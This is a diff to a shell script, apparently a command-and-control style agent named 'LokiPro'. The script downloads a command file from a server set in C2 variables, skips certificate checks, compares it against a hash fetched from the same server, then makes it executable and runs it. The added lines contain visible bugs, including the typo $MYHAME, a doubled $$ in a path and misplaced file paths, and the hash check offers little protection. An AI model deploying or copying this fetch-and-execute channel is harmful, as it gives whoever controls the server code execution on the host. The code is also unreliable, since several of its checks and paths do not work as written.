@@ -12,14 +12,22 @@
 CONFIG
 
 # Download a command file, if there's one there
-$WGET -O $LOKIHOME/$MYNAME-command.txt --no-check-certificate $C2PROTO$C2/$MYNAME
-if [ -f "$LOKIHOME/$MYNAME-command.txt" ]; then
+$WGET -O $LOKIHOME/$MYNAME --no-check-certificate $C2PROTO$C2/$MYNAME
+if [ -f "$LOKIHOME/$MYNAME" ]; then
     # If we downloaded a file, download the hash for it
-        $ECHO "Downloaded $LOKIHOME/$MYNAME-command.txt, checking for $C2PROTO$C2/$MYNAME.hash"
-        $WGET -O $LOKIHOME/$MYNAME-command.hash --no-check-certificate "$C2PROTO$C2/$MYNAME.hash"
+        $ECHO "Downloaded $LOKIHOME/$MYNAME, checking for $C2PROTO$C2/$MYNAME.hash"
+        $WGET -O $LOKIHOME/$MYNAME.hash --no-check-certificate "$C2PROTO$C2/$MYNAME.hash"
 
         # Create a hash of the file that we downloaded to compare to the hash that we downloaded
-    sha256sum $LOKIHOME/$MYNAME-command.txt > $LOKIHOME/$MYNAME-command.check
+    sha256sum $MYNAME > $LOKIHOME/$MYNAME.check
+	if [ $(diff $MYNAME.check $MYHAME.hash) ]; then
+		$LOG "[ALERT] Command File Download did not match hash"
+	else
+		$ECHO "Hash Match, Moving On"
+		mv $MYNAME $MYNAME-command.txt
+		rm $MYNAME.check
+		rm $MYNAME.hash 
+	fi 
 else
     $ECHO "No $LOKIHOME/$MYNAME-command.txt found"
 fi
@@ -27,6 +35,7 @@ fi
 
 if [ -f "$LOKIHOME/$MYNAME-command.txt" ]; then
 	$LOG "Command File Downloaded, Checking Version"
+	
 	# If we downloaded a file, check to see if there is a current command file
 	if [ -f "$LOKIHOME/$MYNAME-current.sh" ]; then
 	# If there is a current command file, compare the two
@@ -42,6 +51,11 @@ if [ -f "$LOKIHOME/$MYNAME-command.txt" ]; then
 		$LOG "No Change in Command"
 		# If they are the same, do nothing
 		fi
+	else
+		$LOG "No previous command file.  Moving this one to command and running"
+		$MV $LOKIHOME/$MYNAME-command.txt $LOKIHOME/$MYNAME-current.sh
+		$CHMOD +x $$LOKIHOME/$MYNAME-current.sh
+		./$LOKIHOME/$MYNAME-current.sh
 	fi 
 else
     echo "LokiPro Nothing found"
